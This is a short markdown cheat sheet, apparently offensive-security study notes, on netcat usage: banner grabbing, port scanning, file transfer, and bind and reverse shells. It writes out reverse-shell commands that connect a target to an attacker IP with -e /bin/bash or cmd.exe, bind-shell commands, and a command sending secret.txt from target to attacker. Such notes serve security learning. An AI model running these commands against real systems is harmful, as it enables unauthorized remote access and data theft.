# Netcat Fundamentals – The TCP/IP Swiss Army Knife

## 🔍 What Is Netcat?

- **Networking utility** for reading/writing data over TCP/UDP
- **Cross-platform**: Works on Linux, Windows, macOS
- **Two modes**:
  - **Client mode**: Connects to remote hosts/ports
  - **Server mode**: Listens for incoming connections

> 💡 **Why it matters**:  
> 
> Built into many systems → perfect for **file transfer**, **port scanning**, and **shell delivery** when other tools are blocked.

---
## 🛠️ Core Use Cases

### 1. **Banner Grabbing**
```bash
nc -nv 192.168.1.10 80
GET / HTTP/1.1
Host: 192.168.1.10
```

→ Reveals server banners (e.g., `Apache/2.4.41`)

### 2. **Port Scanning**
```bash
nc -nvz 192.168.1.10 1-1000    # Scan ports 1-1000
nc -nvzw1 192.168.1.10 22 80 443  # Scan specific ports
```

- `-n`: Skip DNS resolution  
- `-v`: Verbose  
- `-z`: Zero-I/O mode (scan only)  
- `-w1`: 1-second timeout  

### 3. **File Transfer**

**From target → attacker**:
```bash
# Attacker (listener)
nc -nlvp 4444 > received_file.txt

# Target (sender)
nc 10.10.100.8 4444 < secret.txt
```

**From attacker → target**:
```bash
# Attacker (sender)
nc -nlvp 4444 < payload.exe

# Target (receiver)
nc 10.10.100.8 4444 > payload.exe
```

### 4. **Bind Shells**

**On target** (binds shell to port):
```cmd
nc -nlvp 4444 -e cmd.exe      # Windows
nc -nlvp 4444 -e /bin/bash    # Linux
```
**Attacker connects**:
```bash
nc 192.168.1.10 4444
```

### 5. **Reverse Shells**

**Attacker (listener)**:
```bash
nc -nlvp 4444
```
**On target**:
```cmd
nc 10.10.100.8 4444 -e cmd.exe      # Windows
nc 10.10.100.8 4444 -e /bin/bash    # Linux
```

> ⚠️ **Critical Notes**:  
> - `-e` flag **disabled in modern netcat** (use `mkfifo` or redirects instead)  
> - Windows often uses `nc.exe` (no `-e` support) → use **Ncat** or **PowerShell** alternatives

---
## 🧪 Common Flags
| Flag | Purpose |
|------|---------|
| `-n` | Numeric-only IP addresses (no DNS) |
| `-v` | Verbose output |
| `-l` | Listen mode (server) |
| `-p` | Local port (for listener) |
| `-z` | Zero-I/O mode (scanning) |
| `-w` | Timeout (seconds) |
| `-u` | UDP mode (default: TCP) |
